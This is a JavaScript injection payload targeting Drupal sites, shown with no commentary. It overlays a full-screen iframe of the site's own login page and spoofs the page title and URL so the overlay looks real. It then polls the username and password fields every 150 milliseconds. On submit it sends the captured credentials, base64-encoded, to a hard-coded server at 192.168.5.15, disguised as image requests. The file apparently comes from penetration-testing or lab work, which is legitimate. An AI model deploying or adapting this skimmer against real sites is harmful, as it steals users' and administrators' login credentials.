const exfilWebServer = "http://192.168.5.15";
const drupalRoot = "";
const loginURL = drupalRoot + "/user/login";
const iframeID = "ifr";
const cmsID = "_drup_";
var sniffedUsername = "";
var sniffedPassword = "";
var loginTitle = "";
function getEndpointTitle(endpointURL) {
  function decodeEntity(inStr) {
    const textarea = document.createElement("textarea");
    textarea.innerHTML = inStr;
    return textarea.value;
  }
  const req = new XMLHttpRequest();
  req.open("GET", endpointURL, false);
  req.send(null);
  return decodeEntity(req.responseText.match(/<title>(.*)<\/title>/)[1]);
}
function addIframeToCurrPage(iframeID, endpointURL, endpointTitle) {
  const ifr = document.createElement("iframe");
  ifr.id = iframeID;
  ifr.setAttribute("src", endpointURL);
  ifr.style.position = "fixed";
  ifr.style.left = "0px";
  ifr.style.top = "0px";
  ifr.style.width = "100%";
  ifr.style.height = "100%";
  ifr.style.border = "0";
  document.body.appendChild(ifr);
  window.top.document.title = endpointTitle;
}
function monitorDrupalUserInput(iframeID, endpointTitle) {
  const endpointURL = document.getElementById(iframeID).contentDocument.location.pathname;
  window.history.replaceState(null, endpointTitle, endpointURL);
  var inputTags, i;
  inputTags = document.getElementById(iframeID).contentDocument.getElementsByTagName("input");
  for (i = 0; i < inputTags.length; i ++) {
    if (inputTags[i].id == "edit-name") {
      if (sniffedUsername != inputTags[i].value) {
        sniffedUsername = inputTags[i].value;
      }
    }
    if (inputTags[i].id == "edit-pass") {
      if (sniffedPassword != inputTags[i].value) {
        sniffedPassword = inputTags[i].value;
      }
    }
  }
  const ifr = document.getElementById(iframeID);
  ifr.contentDocument.body.addEventListener("submit", exfilCreds);
  function exfilCreds() {
    function exfilData(path, data) {
      const exfilImage = new Image();
      exfilImage.onload = function() { image.src = this.src; };
      exfilImage.src = exfilWebServer + path + encodeURIComponent(btoa(location.host + cmsID + data)) + ".jpg";
    }
    exfilData("/images1/", sniffedUsername);
    exfilData("/images2/", sniffedPassword);
  }
}
loginTitle = getEndpointTitle(loginURL);
addIframeToCurrPage(iframeID, loginURL, loginTitle);
setInterval(function() { monitorDrupalUserInput(iframeID, loginTitle); }, 150);
